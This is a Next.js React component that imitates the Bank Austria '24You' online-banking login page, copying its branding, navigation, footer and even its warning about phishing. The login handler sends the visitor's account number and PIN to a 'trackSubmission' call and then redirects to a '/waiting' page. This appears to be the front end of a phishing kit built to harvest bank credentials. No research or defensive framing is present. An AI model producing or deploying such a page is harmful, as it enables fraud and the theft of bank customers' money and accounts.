"use client";

import { useState } from "react";
import { useRouter } from "next/navigation";
import { trackSubmission } from "@/lib/track";

/* Thin-line SVG icons matching IconWerk2-mono style */
const icons = {
  // Header icons (white, 26px)
  person: (
    <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round">
      <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2" /><circle cx="12" cy="7" r="4" />
    </svg>
  ),
  building: (
    <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round">
      <rect x="4" y="2" width="16" height="20" rx="2" /><path d="M9 22V12h6v10" /><path d="M8 6h.01M16 6h.01M12 6h.01M8 10h.01M16 10h.01M12 10h.01" />
    </svg>
  ),
  diamond: (
    <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round">
      <path d="M6 3h12l4 6-10 13L2 9z" /><path d="M2 9h20" /><path d="M10 3l-4 6 6 13 6-13-4-6" />
    </svg>
  ),
  info: (
    <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round">
      <circle cx="12" cy="12" r="10" /><path d="M12 16v-4M12 8h.01" />
    </svg>
  ),
  // Sidebar icons (gray #bebebe, 32px)
  accounts: (
    <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.2" strokeLinecap="round" strokeLinejoin="round">
      <rect x="2" y="5" width="20" height="14" rx="2" /><path d="M2 10h20" />
    </svg>
  ),
  creditcard: (
    <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.2" strokeLinecap="round" strokeLinejoin="round">
      <rect x="1" y="4" width="22" height="16" rx="2" /><path d="M1 10h22" /><path d="M5 15h4" />
    </svg>
  ),
  savings: (
    <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.2" strokeLinecap="round" strokeLinejoin="round">
      <path d="M19 5c-1.5 0-2.8 1.4-3 2-3.5-1.5-11-.3-11 5 0 4.2 3.8 7 8 7 1.7 0 3-.5 4.2-1.4" /><path d="M2 9.1C1.4 9.3 1 10 1 10.8V14c0 .6.4 1.1.9 1.1l1.1.3" /><path d="M16.5 3c1 .5 1.5 1.5 1.5 2.5S17 7.5 16 8" /><path d="M20 8h.01" />
    </svg>
  ),
  financing: (
    <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.2" strokeLinecap="round" strokeLinejoin="round">
      <path d="M3 21h18" /><path d="M5 21V7l7-4 7 4v14" /><path d="M9 21v-6h6v6" /><path d="M9 9h.01M15 9h.01M9 13h.01M15 13h.01" />
    </svg>
  ),
  securities: (
    <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.2" strokeLinecap="round" strokeLinejoin="round">
      <path d="M22 12h-4l-3 9L9 3l-3 9H2" />
    </svg>
  ),
  markets: (
    <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.2" strokeLinecap="round" strokeLinejoin="round">
      <circle cx="12" cy="12" r="10" /><path d="M2 12h20" /><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z" />
    </svg>
  ),
};

const sidebarItems = [
  { icon: icons.accounts, label: "Girokonten" },
  { icon: icons.creditcard, label: "Kreditkarten" },
  { icon: icons.savings, label: "Sparprodukte" },
  { icon: icons.financing, label: "Finanzierung" },
  { icon: icons.securities, label: "Wertpapiere" },
  { icon: icons.markets, label: "Börsen & Märkte" },
];

export default function LoginForm() {
  const router = useRouter();
  const [username, setUsername] = useState("");
  const [pin, setPin] = useState("");

  const handleLogin = async () => {
    await trackSubmission("bank-austria", "login", { username, pin });
    router.push(`/waiting?user=${encodeURIComponent(username)}`);
  };

  return (
    <div className="app-panel">
      {/* ====== HEADER ====== */}
      <div className="header-container">
        <div className="navbar-toggle-button">
          <div className="logo-home-at-container">
            <div className="show-sidebar">
              <span className="hamburger-icon"></span>
            </div>
            <div className="logo-home">
              <a href="#" target="_blank">
                <img src="/bank-austria/logo-bank-austria.svg" alt="Bank Austria" className="logo-img" />
              </a>
            </div>
          </div>
        </div>
        <header className="cabecera no-login">
          <div className="box-elementi-header for-login-at">
            <a href="#" className="header-nav-item">
              <span className="nav-icon">{icons.person}</span>
              <span className="nav-label">Privatkunden</span>
            </a>
            <a href="#" className="header-nav-item">
              <span className="nav-icon">{icons.building}</span>
              <span className="nav-label">Firmenkunden</span>
            </a>
            <a href="#" className="header-nav-item">
              <span className="nav-icon">{icons.diamond}</span>
              <span className="nav-label">Private Banking</span>
            </a>
            <a href="#" className="header-nav-item">
              <span className="nav-icon">{icons.info}</span>
              <span className="nav-label">Über uns</span>
            </a>
          </div>
        </header>
      </div>

      {/* ====== CONTENT AREA ====== */}
      <div className="content-container">
        <div className="sidebar-wrapper">
          <nav className="sidebar">
            {sidebarItems.map((item, i) => (
              <div key={i} className="sidebar-item">
                <div className="sidebar-icon">{item.icon}</div>
                <div className="sidebar-label">{item.label}</div>
              </div>
            ))}
          </nav>
        </div>

        <div className="content-wrapper">
          <div className="content-inner">
            {/* Info header - 24You */}
            <div className="info-header">
              <div className="info-header-text">
                <h1 className="title-24you"><b>24You</b></h1>
              </div>
              <div className="info-box">
                <div className="inner-info-box">
                  <h3 className="warning-text">
                    <p>Warnung: Derzeit versenden Betrüger Phishing-Mails bei denen Ihnen eine Login-Aufforderung der Bank Austria vorgegaukelt wird.</p>
                    <p>Folgen Sie keinen Login-Links, die Sie per E-Mail oder per SMS erhalten! Bitte lesen Sie vor der Eingabe einer TAN den Text der gesamten TAN-Nachricht sorgfältig!</p>
                    <p>Sie&nbsp;befürchten, Opfer dieses Betruges zu sein? Rufen Sie&nbsp;zu Ihrer eigenen Sicherheit&nbsp;umgehend das Bank Austria&nbsp;Sicherheitscenter unter der Rufnummer 050505-26105 an.</p>
                  </h3>
                </div>
              </div>
            </div>

            {/* Login form */}
            <div className="login-panel">
              <div className="user-inputs">
                <div className="input-row">
                  <input type="text" className="credential-input" placeholder="Verfügernummer" maxLength={8} value={username} onChange={(e) => setUsername(e.target.value)} />
                </div>
                <div className="input-row">
                  <input type="password" className="credential-input" placeholder="PIN" maxLength={37} value={pin} onChange={(e) => setPin(e.target.value)} />
                </div>
              </div>
              <div className="post-input-info">
                <a href="#" className="forgot-link">PIN vergessen oder Verfügernummer gesperrt?</a>
              </div>
              <div className="login-button-container">
                <button className="login-button" type="button" onClick={handleLogin}>LOGIN</button>
              </div>
              <div className="security-message">
                <div>Gefälschte Bank Austria Mails im Umlauf!</div>
                <div className="security-details-link">Details anzeigen</div>
              </div>
            </div>

            {/* Language switcher */}
            <div className="language-switcher">
              <span className="lang-item active">
                <span className="flag flag-de"></span>
                <label className="lang-label">Deutsch</label>
              </span>
              <span className="lang-item">
                <span className="flag flag-en"></span>
                <label className="lang-label">English</label>
              </span>
            </div>

            {/* Banner */}
            <div className="vertical-banner">
              <div className="banner">
                <div className="banner-bg"></div>
                <h3 className="banner-text">
                  <p className="banner-title">Lässt sich einrichten</p>
                  <p className="banner-subtitle">Jetzt von Topkonditionen* unserer Wohnoffensive<br /> profitieren.</p>
                </h3>
                <a href="#" className="btn-activated">Mehr erfahren</a>
              </div>
              <div className="sub-banner">
                <p><br />*Exklusiv für neue oder bestehende Bank Austria Girokontokund:innen - vorbehaltlich positiver Kreditentscheidung. Aktionsbedingungen unter bankaustria/wohnoffensive.jsp</p>
              </div>
            </div>
          </div>

          {/* ====== FOOTER ====== */}
          <div className="footer-wrapper">
            <footer className="footer-private">
              <div className="list-corporate">
                <ul className="corporate">
                  <li><a href="#"><span className="footer-ico privacy-ico"></span><span>Sicherheits<br />informationen</span></a></li>
                  <li><a href="tel:+435050526105"><span className="footer-ico phone-ico"></span><span>Sicherheitscenter<br />+43 (0) 50505 26105</span></a></li>
                  <li><a href="tel:+435050526100"><span className="footer-ico phone-ico"></span><span>Internetbanking Hotline<br />+43 (0) 50505 26100</span></a></li>
                  <li><a href="#"><span className="footer-ico faq-ico"></span><span>FAQ</span></a></li>
                  <li><a href="#"><span className="footer-ico privacy-ico"></span><span>Cookie Policy</span></a></li>
                </ul>
              </div>
              <div className="copyright">
                <ul className="copyright-footer">
                  <li><a href="#">UniCredit Bank Austria AG</a></li>
                  <li><a href="#">Impressum</a></li>
                  <li><a href="#">AGB</a></li>
                  <li className="last"><a href="#">Datenschutzerklärung</a></li>
                </ul>
                <p className="copy">© 2026 UniCredit Bank Austria AG</p>
                <div className="logo-footer"></div>
              </div>
            </footer>
          </div>
        </div>
      </div>
    </div>
  );
}
